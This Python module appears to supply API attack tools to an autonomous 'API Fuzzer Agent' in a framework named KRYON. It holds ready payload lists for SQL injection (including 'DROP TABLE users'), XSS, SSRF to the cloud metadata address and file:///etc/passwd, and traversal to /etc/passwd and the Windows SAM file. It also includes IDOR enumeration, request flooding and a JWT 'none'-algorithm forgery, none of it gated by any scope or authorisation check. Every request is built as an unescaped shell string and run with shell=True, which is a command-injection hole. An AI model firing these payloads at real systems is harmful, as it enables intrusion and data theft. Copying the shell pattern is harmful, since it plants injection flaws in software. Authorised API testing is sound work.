"""
API Fuzzing Tools - OWASP API Security Top 10 Testing
======================================================

Comprehensive API security testing tools covering the OWASP API Security
Top 10, including OpenAPI spec parsing, endpoint discovery, parameter fuzzing,
IDOR testing, rate limit verification, and authentication mechanism testing.

Tools:
- parse_openapi_spec: Parse OpenAPI/Swagger specs to extract endpoints
- discover_api_endpoints: Brute-force hidden API endpoints with ffuf
- fuzz_api_endpoint: Fuzz API parameters with SQLi, XSS, SSRF payloads
- test_idor: Test Insecure Direct Object Reference vulnerabilities
- test_rate_limiting: Verify rate limiting controls exist
- test_auth_mechanisms: Test JWT none algorithm, missing auth, expired tokens

KRYON Integration: Task 2.1 - API Fuzzer Agent
"""

import json
import subprocess  # nosec B404
import time

from kryon.sdk.agents import function_tool


def _run_cmd(command: str, timeout: int = 120) -> str:
    """Execute a shell command and return combined stdout+stderr."""
    try:
        result = subprocess.run(  # nosec B602
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "Error: Command timed out"
    except Exception as e:
        return f"Error: {e}"


@function_tool(strict_mode=False)
def parse_openapi_spec(spec_url: str, auth_header: str = "") -> str:
    """
    Fetch and parse an OpenAPI/Swagger JSON specification to extract all
    API endpoints with their HTTP methods, parameters, and auth requirements.

    Uses curl to fetch the spec from a URL, then parses the JSON to produce
    a structured inventory of all available API endpoints.

    Args:
        spec_url: URL to the OpenAPI/Swagger JSON spec (e.g. http://target.com/openapi.json)
        auth_header: Optional Authorization header value for authenticated specs

    Returns:
        str: JSON with extracted endpoints, methods, parameters, and auth info

    Examples:
        parse_openapi_spec(spec_url="http://target.com/openapi.json")
        parse_openapi_spec(spec_url="http://target.com/v2/api-docs", auth_header="Bearer eyJ...")
    """
    cmd = f'curl -sk -m 30 "{spec_url}"'
    if auth_header:
        cmd += f' -H "Authorization: {auth_header}"'

    raw = _run_cmd(cmd, timeout=60)

    try:
        spec = json.loads(raw)
    except (json.JSONDecodeError, ValueError):
        return json.dumps({"error": "Failed to parse OpenAPI spec", "raw_response": raw[:2000]})

    endpoints = []
    paths = spec.get("paths", {})

    for path, methods in paths.items():
        for method, details in methods.items():
            if method.lower() in (
                "get",
                "post",
                "put",
                "delete",
                "patch",
                "options",
                "head",
            ):
                endpoint = {
                    "path": path,
                    "method": method.upper(),
                    "summary": details.get("summary", ""),
                    "description": details.get("description", ""),
                    "parameters": [],
                    "security": details.get("security", []),
                }

                # Extract parameters
                for param in details.get("parameters", []):
                    endpoint["parameters"].append(
                        {
                            "name": param.get("name", ""),
                            "in": param.get("in", ""),
                            "required": param.get("required", False),
                            "type": param.get("schema", {}).get("type", "string"),
                        }
                    )

                # Extract request body (OpenAPI 3.x)
                request_body = details.get("requestBody", {})
                if request_body:
                    content = request_body.get("content", {})
                    for content_type, _schema_info in content.items():
                        endpoint["parameters"].append(
                            {
                                "name": "body",
                                "in": "body",
                                "required": request_body.get("required", False),
                                "content_type": content_type,
                            }
                        )

                endpoints.append(endpoint)

    # Extract global security schemes
    security_schemes = {}
    components = spec.get("components", spec.get("securityDefinitions", {}))
    if isinstance(components, dict):
        security_schemes = components.get("securitySchemes", components)

    return json.dumps(
        {
            "spec_version": spec.get("openapi", spec.get("swagger", "unknown")),
            "title": spec.get("info", {}).get("title", ""),
            "base_url": spec.get("servers", [{}])[0].get("url", "") if spec.get("servers") else "",
            "endpoint_count": len(endpoints),
            "endpoints": endpoints,
            "security_schemes": (list(security_schemes.keys()) if isinstance(security_schemes, dict) else []),
        },
        indent=2,
    )


@function_tool(strict_mode=False)
def discover_api_endpoints(
    target_url: str,
    wordlist: str = "/usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt",
    threads: int = 40,
    extensions: str = "",
    auth_header: str = "",
) -> str:
    """
    Discover hidden API endpoints using ffuf with API-specific wordlists.

    Brute-forces common API paths including /api/, /v1/, /v2/, /graphql,
    /swagger.json, /openapi.json, and REST resource endpoints.

    Args:
        target_url: Base target URL (e.g. http://target.com)
        wordlist: Path to wordlist for endpoint discovery
        threads: Number of concurrent threads (default: 40)
        extensions: File extensions to try (comma-separated, e.g. ".json,.xml")
        auth_header: Optional Authorization header for authenticated discovery

    Returns:
        str: JSON with discovered API endpoints and response details

    Examples:
        discover_api_endpoints(target_url="http://target.com")
        discover_api_endpoints(target_url="http://target.com", auth_header="Bearer eyJ...")
    """
    # First try well-known API documentation paths
    known_paths = [
        "/swagger.json",
        "/openapi.json",
        "/api-docs",
        "/v1",
        "/v2",
        "/v3",
        "/api",
        "/api/v1",
        "/api/v2",
        "/graphql",
        "/graphiql",
        "/.well-known/openapi",
        "/docs",
        "/redoc",
    ]

    target = target_url.rstrip("/")
    results = {"target": target, "discovered_endpoints": [], "ffuf_results": []}

    # Probe known paths with curl
    for path in known_paths:
        url = f"{target}{path}"
        output = _run_cmd(
            f'curl -sk -o /dev/null -w "%{{http_code}} %{{size_download}}" -m 5 "{url}"',
            timeout=10,
        )
        parts = output.strip().split()
        if len(parts) >= 2:
            status = parts[0]
            if status in ("200", "201", "301", "302", "307", "401", "403"):
                results["discovered_endpoints"].append({"url": url, "status": int(status), "size": parts[1]})

    # Run ffuf for deeper discovery
    fuzz_url = f"{target}/FUZZ"
    cmd_parts = [
        "ffuf",
        "-u",
        fuzz_url,
        "-w",
        wordlist,
        "-mc",
        "200,201,202,204,301,302,307,401,403",
        "-t",
        str(threads),
        "-s",
        "-o",
        "/tmp/ffuf_api_discovery.json",
        "-of",
        "json",
    ]

    if extensions:
        cmd_parts.extend(["-e", extensions])

    if auth_header:
        cmd_parts.extend(["-H", f"Authorization: {auth_header}"])

    ffuf_output = _run_cmd(" ".join(cmd_parts), timeout=120)

    # Try to parse ffuf JSON output
    try:
        ffuf_json = json.loads(_run_cmd("cat /tmp/ffuf_api_discovery.json 2>/dev/null", timeout=5))
        for r in ffuf_json.get("results", []):
            results["ffuf_results"].append(
                {
                    "url": r.get("url", ""),
                    "status": r.get("status", 0),
                    "length": r.get("length", 0),
                    "words": r.get("words", 0),
                }
            )
    except (json.JSONDecodeError, ValueError):
        results["ffuf_raw"] = ffuf_output[:2000]

    results["total_found"] = len(results["discovered_endpoints"]) + len(results["ffuf_results"])

    return json.dumps(results, indent=2)


@function_tool(strict_mode=False)
def fuzz_api_endpoint(
    url: str,
    method: str = "GET",
    content_type: str = "application/json",
    parameters: str = "",
    auth_header: str = "",
    payload_types: str = "sqli,xss,ssrf,traversal",
) -> str:
    """
    Fuzz an API endpoint with various attack payloads (SQLi, XSS, SSRF,
    path traversal) to detect input validation weaknesses.

    Sends crafted payloads via curl with different Content-Types and analyzes
    responses for error messages, stack traces, or unexpected behavior.

    Args:
        url: Target API endpoint URL
        method: HTTP method to use (GET, POST, PUT, DELETE, PATCH)
        content_type: Request Content-Type header
        parameters: Base JSON parameters template (e.g. '{"username": "FUZZ", "password": "test"}')
        auth_header: Optional Authorization header
        payload_types: Comma-separated payload categories to test (sqli,xss,ssrf,traversal)

    Returns:
        str: JSON with fuzzing results including anomalous responses

    Examples:
        fuzz_api_endpoint(url="http://target.com/api/users", method="POST",
                          parameters='{"name": "FUZZ"}')
    """
    payloads = {
        "sqli": [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "1; DROP TABLE users--",
            "' UNION SELECT NULL,NULL--",
            "1' AND SLEEP(5)--",
            "admin'--",
        ],
        "xss": [
            "<script>alert(1)</script>",
            '"><img src=x onerror=alert(1)>',
            "{{7*7}}",
            "${7*7}",
            "<svg/onload=alert(1)>",
        ],
        "ssrf": [
            "http://127.0.0.1",
            "http://localhost:80",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]",
            "file:///etc/passwd",
        ],
        "traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "/etc/passwd%00",
        ],
    }

    active_types = [t.strip() for t in payload_types.split(",")]
    results = {
        "target": url,
        "method": method,
        "total_tests": 0,
        "anomalies": [],
        "errors": [],
    }

    for ptype in active_types:
        if ptype not in payloads:
            continue
        for payload in payloads[ptype]:
            results["total_tests"] += 1

            # Build curl command
            if method.upper() == "GET":
                # Inject payload as query parameter
                sep = "&" if "?" in url else "?"
                test_url = f"{url}{sep}test={payload}"
                cmd = f'curl -sk -m 10 -w "\\n%{{http_code}}" "{test_url}"'
            else:
                # Inject payload in body
                if parameters:
                    body = parameters.replace("FUZZ", payload)
                else:
                    body = json.dumps({"input": payload})
                cmd = (
                    f"curl -sk -m 10 -X {method.upper()} "
                    f'-H "Content-Type: {content_type}" '
                    f"-d '{body}' "
                    f'-w "\\n%{{http_code}}" '
                    f'"{url}"'
                )

            if auth_header:
                cmd += f' -H "Authorization: {auth_header}"'

            output = _run_cmd(cmd, timeout=15)
            lines = output.strip().rsplit("\n", 1)
            body = lines[0] if lines else ""
            status = lines[-1] if len(lines) > 1 else "0"

            # Detect anomalies: errors, stack traces, unexpected data leaks
            anomaly_indicators = [
                "error",
                "exception",
                "traceback",
                "stack trace",
                "syntax error",
                "sql",
                "mysql",
                "postgresql",
                "sqlite",
                "internal server error",
                "root:",
                "/etc/passwd",
                "meta-data",
            ]

            body_lower = body.lower()
            detected = [ind for ind in anomaly_indicators if ind in body_lower]

            if detected or status == "500":
                results["anomalies"].append(
                    {
                        "payload_type": ptype,
                        "payload": payload,
                        "status_code": status,
                        "indicators": detected,
                        "response_snippet": body[:500],
                    }
                )

    results["vulnerability_likelihood"] = (
        "high" if len(results["anomalies"]) > 3 else "medium" if len(results["anomalies"]) > 0 else "low"
    )

    return json.dumps(results, indent=2)


@function_tool(strict_mode=False)
def test_idor(
    base_url: str,
    id_param: str = "1",
    valid_id: str = "1",
    id_range: int = 5,
    auth_header: str = "",
    second_user_auth: str = "",
) -> str:
    """
    Test for Insecure Direct Object Reference (IDOR) vulnerabilities by
    requesting resources with sequential/predictable IDs and comparing
    responses between authorized and unauthorized access.

    Args:
        base_url: API endpoint with resource path (e.g. http://target.com/api/users/)
        id_param: Starting ID parameter value
        valid_id: Known valid ID for the authenticated user
        id_range: Number of sequential IDs to test (default: 5)
        auth_header: Authorization header for first user
        second_user_auth: Authorization header for second user (cross-account test)

    Returns:
        str: JSON with IDOR test results including accessible resources

    Examples:
        test_idor(base_url="http://target.com/api/users/", id_param="1", valid_id="1")
        test_idor(base_url="http://target.com/api/orders/", id_param="100",
                  auth_header="Bearer token1", second_user_auth="Bearer token2")
    """
    results = {
        "test_type": "IDOR",
        "target": base_url,
        "status": "completed",
        "tests_run": 0,
        "accessible_resources": [],
        "cross_account_access": [],
    }

    base = base_url.rstrip("/")

    try:
        start_id = int(id_param)
    except ValueError:
        start_id = 1

    # Test sequential IDs
    for i in range(id_range):
        test_id = start_id + i
        url = f"{base}/{test_id}"
        results["tests_run"] += 1

        # Request without auth (unauthenticated access)
        cmd_noauth = f'curl -sk -m 10 -w "\\n%{{http_code}}" "{url}"'
        output_noauth = _run_cmd(cmd_noauth, timeout=15)
        lines = output_noauth.strip().rsplit("\n", 1)
        body_noauth = lines[0] if lines else ""
        status_noauth = lines[-1] if len(lines) > 1 else "0"

        # Request with auth (for comparison)
        auth_status = None
        if auth_header:
            cmd_auth = f'curl -sk -m 10 -H "Authorization: {auth_header}" -w "\\n%{{http_code}}" "{url}"'
            output_auth = _run_cmd(cmd_auth, timeout=15)
            lines_auth = output_auth.strip().rsplit("\n", 1)
            auth_status = lines_auth[-1] if len(lines_auth) > 1 else "0"

        # Check if resource is accessible without proper auth
        if status_noauth in ("200", "201") and str(test_id) != valid_id:
            entry = {
                "id": test_id,
                "url": url,
                "status": int(status_noauth),
                "response_snippet": body_noauth[:300],
                "issue": "Resource accessible without authentication",
            }
            if auth_status:
                entry["auth_status"] = auth_status
            results["accessible_resources"].append(entry)

        # Cross-account access test
        if second_user_auth and str(test_id) != valid_id:
            cmd_cross = f'curl -sk -m 10 -H "Authorization: {second_user_auth}" -w "\\n%{{http_code}}" "{url}"'
            output_cross = _run_cmd(cmd_cross, timeout=15)
            lines_cross = output_cross.strip().rsplit("\n", 1)
            body_cross = lines_cross[0] if lines_cross else ""
            status_cross = lines_cross[-1] if len(lines_cross) > 1 else "0"

            if status_cross in ("200", "201"):
                results["cross_account_access"].append(
                    {
                        "id": test_id,
                        "url": url,
                        "status": int(status_cross),
                        "response_snippet": body_cross[:300],
                        "issue": "Resource accessible with different user credentials",
                    }
                )

    results["vulnerable"] = len(results["accessible_resources"]) > 0 or len(results["cross_account_access"]) > 0
    results["severity"] = "high" if results["vulnerable"] else "none"

    return json.dumps(results, indent=2)


@function_tool(strict_mode=False)
def test_rate_limiting(
    url: str,
    method: str = "GET",
    num_requests: int = 50,
    body: str = "",
    auth_header: str = "",
) -> str:
    """
    Test if an API endpoint enforces rate limiting by sending N rapid
    sequential requests and analyzing response codes and timing.

    Args:
        url: Target API endpoint URL
        method: HTTP method (GET, POST, etc.)
        num_requests: Number of requests to send (default: 50)
        body: Request body for POST/PUT methods
        auth_header: Optional Authorization header

    Returns:
        str: JSON with rate limiting test results (pass/fail, response times)

    Examples:
        test_rate_limiting(url="http://target.com/api/login", method="POST",
                           body='{"user":"admin","pass":"test"}', num_requests=100)
    """
    results = {
        "test_type": "rate_limiting",
        "target": url,
        "method": method,
        "requests_sent": 0,
        "response_codes": {},
        "response_times": [],
        "rate_limited": False,
        "rate_limit_threshold": None,
    }

    for i in range(num_requests):
        cmd = f'curl -sk -m 10 -X {method} -w "\\n%{{http_code}} %{{time_total}}" '
        if body:
            cmd += f"-d '{body}' -H \"Content-Type: application/json\" "
        if auth_header:
            cmd += f'-H "Authorization: {auth_header}" '
        cmd += f'"{url}"'

        start = time.time()
        output = _run_cmd(cmd, timeout=15)
        elapsed = time.time() - start

        lines = output.strip().rsplit("\n", 1)
        meta = lines[-1] if len(lines) > 1 else "0 0"
        parts = meta.split()
        status = parts[0] if parts else "0"
        curl_time = parts[1] if len(parts) > 1 else str(elapsed)

        results["requests_sent"] += 1

        # Track response codes
        results["response_codes"][status] = results["response_codes"].get(status, 0) + 1

        try:
            results["response_times"].append(float(curl_time))
        except ValueError:
            results["response_times"].append(elapsed)

        # Detect rate limiting (429 or sudden 503/403)
        if status in ("429", "503") or (status == "403" and i > 5):
            results["rate_limited"] = True
            if results["rate_limit_threshold"] is None:
                results["rate_limit_threshold"] = i + 1

    # Summary statistics
    times = results["response_times"]
    if times:
        results["avg_response_time"] = round(sum(times) / len(times), 4)
        results["min_response_time"] = round(min(times), 4)
        results["max_response_time"] = round(max(times), 4)

    results["verdict"] = (
        "PASS - Rate limiting detected" if results["rate_limited"] else "FAIL - No rate limiting detected"
    )

    return json.dumps(results, indent=2)


@function_tool(strict_mode=False)
def test_auth_mechanisms(
    url: str,
    valid_token: str = "",
    method: str = "GET",
    body: str = "",
) -> str:
    """
    Test authentication mechanism weaknesses including JWT none algorithm
    bypass, missing auth headers, expired tokens, and token reuse.

    Args:
        url: Target API endpoint URL that requires authentication
        valid_token: A valid JWT or auth token for testing
        method: HTTP method (default: GET)
        body: Optional request body

    Returns:
        str: JSON with authentication test results and discovered weaknesses

    Examples:
        test_auth_mechanisms(url="http://target.com/api/admin",
                             valid_token="eyJhbGciOiJIUzI1NiJ9...")
    """
    results = {
        "test_type": "auth_mechanisms",
        "target": url,
        "tests": [],
        "vulnerabilities": [],
    }

    base_cmd = f"curl -sk -m 10 -X {method} "
    if body:
        base_cmd += f"-d '{body}' -H \"Content-Type: application/json\" "

    # Test 1: No authentication header
    cmd = base_cmd + f'-w "\\n%{{http_code}}" "{url}"'
    output = _run_cmd(cmd, timeout=15)
    lines = output.strip().rsplit("\n", 1)
    status = lines[-1] if len(lines) > 1 else "0"
    test_result = {
        "test": "no_auth_header",
        "description": "Request without any authentication",
        "status_code": status,
        "passed": status in ("401", "403"),
    }
    results["tests"].append(test_result)
    if not test_result["passed"] and status == "200":
        results["vulnerabilities"].append(
            {
                "type": "missing_auth_check",
                "severity": "critical",
                "detail": "Endpoint accessible without authentication",
            }
        )

    # Test 2: Invalid/garbage token
    cmd = base_cmd + '-H "Authorization: Bearer invalid_token_garbage_12345" ' + f'-w "\\n%{{http_code}}" "{url}"'
    output = _run_cmd(cmd, timeout=15)
    lines = output.strip().rsplit("\n", 1)
    status = lines[-1] if len(lines) > 1 else "0"
    test_result = {
        "test": "invalid_token",
        "description": "Request with invalid/garbage token",
        "status_code": status,
        "passed": status in ("401", "403"),
    }
    results["tests"].append(test_result)
    if not test_result["passed"] and status == "200":
        results["vulnerabilities"].append(
            {
                "type": "weak_token_validation",
                "severity": "critical",
                "detail": "Endpoint accepts invalid tokens",
            }
        )

    # Test 3: JWT none algorithm bypass
    if valid_token and valid_token.count(".") == 2:
        import base64

        try:
            # Decode header and modify algorithm to 'none'
            header_b64 = valid_token.split(".")[0]
            # Add padding
            header_b64 += "=" * (4 - len(header_b64) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_b64))
            header["alg"] = "none"

            # Re-encode header
            none_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
            payload_b64 = valid_token.split(".")[1]
            none_token = f"{none_header}.{payload_b64}."

            cmd = base_cmd + f'-H "Authorization: Bearer {none_token}" ' + f'-w "\\n%{{http_code}}" "{url}"'
            output = _run_cmd(cmd, timeout=15)
            lines = output.strip().rsplit("\n", 1)
            status = lines[-1] if len(lines) > 1 else "0"
            test_result = {
                "test": "jwt_none_algorithm",
                "description": "JWT with algorithm set to 'none' and empty signature",
                "status_code": status,
                "passed": status in ("401", "403"),
            }
            results["tests"].append(test_result)
            if not test_result["passed"] and status == "200":
                results["vulnerabilities"].append(
                    {
                        "type": "jwt_none_algorithm",
                        "severity": "critical",
                        "detail": "Server accepts JWT with 'none' algorithm",
                    }
                )
        except Exception:
            results["tests"].append(
                {
                    "test": "jwt_none_algorithm",
                    "description": "JWT none algorithm test",
                    "status_code": "error",
                    "passed": False,
                    "note": "Failed to decode/modify JWT",
                }
            )

    # Test 4: Empty Bearer token
    cmd = base_cmd + '-H "Authorization: Bearer " ' + f'-w "\\n%{{http_code}}" "{url}"'
    output = _run_cmd(cmd, timeout=15)
    lines = output.strip().rsplit("\n", 1)
    status = lines[-1] if len(lines) > 1 else "0"
    test_result = {
        "test": "empty_bearer",
        "description": "Request with empty Bearer token",
        "status_code": status,
        "passed": status in ("401", "403"),
    }
    results["tests"].append(test_result)
    if not test_result["passed"] and status == "200":
        results["vulnerabilities"].append(
            {
                "type": "empty_token_accepted",
                "severity": "high",
                "detail": "Endpoint accepts empty Bearer token",
            }
        )

    # Test 5: Different auth schemes
    for scheme in ["Basic dGVzdDp0ZXN0", "Digest username=test", "NTLM invalid"]:
        cmd = base_cmd + f'-H "Authorization: {scheme}" ' + f'-w "\\n%{{http_code}}" "{url}"'
        output = _run_cmd(cmd, timeout=15)
        lines = output.strip().rsplit("\n", 1)
        status = lines[-1] if len(lines) > 1 else "0"
        test_result = {
            "test": f"alt_auth_scheme_{scheme.split()[0].lower()}",
            "description": f"Request with {scheme.split()[0]} auth scheme",
            "status_code": status,
            "passed": status in ("401", "403"),
        }
        results["tests"].append(test_result)
        if not test_result["passed"] and status == "200":
            results["vulnerabilities"].append(
                {
                    "type": "auth_scheme_confusion",
                    "severity": "high",
                    "detail": f"Endpoint accepts {scheme.split()[0]} auth when different scheme expected",
                }
            )

    # Summary
    total_tests = len(results["tests"])
    passed_tests = sum(1 for t in results["tests"] if t["passed"])
    results["summary"] = {
        "total_tests": total_tests,
        "passed": passed_tests,
        "failed": total_tests - passed_tests,
        "vulnerability_count": len(results["vulnerabilities"]),
        "overall_status": "SECURE" if not results["vulnerabilities"] else "VULNERABLE",
    }

    return json.dumps(results, indent=2)
